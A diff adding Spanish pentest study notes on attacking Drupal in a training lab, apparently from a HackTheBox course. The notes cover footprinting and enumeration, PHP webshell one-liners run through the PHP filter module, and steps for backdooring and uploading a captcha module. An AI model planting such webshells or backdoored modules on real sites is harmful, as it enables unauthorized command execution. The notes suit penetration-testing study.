@@ -1,0 +1,54 @@
+	### Attacking Drupal
+CMS escrito en PHP que usa MySQL o PostgresSQL para el backend. Si no hay DBMs se puede usar SQLite.
+Permite crear paginas web mediante el uso de temas y modulos. El 1.5% de internet corre Drupal
+
+	## Footprinting
+curl -s http://drupal.inlanefreight.local | grep Drupal
+#Permite ver si en el output se nos devuelve informacion de Drupal y asi saber que se esta utilizando
+CHANGELOG.txt o README.txt
+#La presencia de estos archivos puede signidicar el uso de Drupal.
+robots.txt
+#Este archivo, como pasa con Joomla, puede darnos indicios de que se esta enfrentando este CMS.
+/node/<nodeid>
+#Drupal indexa el contenido mediante nodos. Este tipo de path en la url puede darnos la pista de que se utiliza
+
+Administrator
+#Tipo de usuario Drupal con todos los permisos en la pagina
+Authenticated User
+#Usuario que se puede loguear en la pagina y realizar cieras operaciones como agregar articulos, editarlos, etc
+Anonymous
+#Todos los visistantes de la pagina estan designado como anonymous por default.
+
+	## Enumeracion
+curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
+#Devuelve version de Drupal en uso
+droopescan scan drupal -u http://drupal.inlanefreight.local
+#Permite enumerar plugins, temas y versiones
+
+	## PHP filter module
+https://academy.hackthebox.com/module/113/section/1209
+<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);?>
+#Antes de la version 8 de Drupal, era posible loguerse como admin y habilitar PHP filter que permitia tener embeded codigo PHP. Gracias a esto, se podria crear una "Basic page" y agregar codigo PHP para ejecutar una webshell
+
+wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+#En versiones posteriores a la 8, debemos instalar el modulo por nosotros mismos mediante Administration > Reports > Available updates
+
+	## Backdoored Module
+wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+tar xvf captcha-8.x-1.2.tar.gz
+<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]); ?>
+#Se crea una webshell
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+#Se crea un .htaccess para darnos acceso al folder.
+mv shell.php .htaccess captcha
+tar cvf captcha.tar.gz captcha/
+#Con acceso administrador Manage > Extend > + > Install new module. De esta forma, subimos el captcha y al visistar la pagina con el parametro de la webshell podemos ejecutar comandos.
+
+	## Known vulns
+Drupalgeddon 1
+Drupalgeddon 2
+Drupalgeddon 3
+#Son 3 vulnerabilidades conocidas las cuales permiten obtener shell o user admin. Hay pocs disponibles. https://academy.hackthebox.com/module/113/section/1209
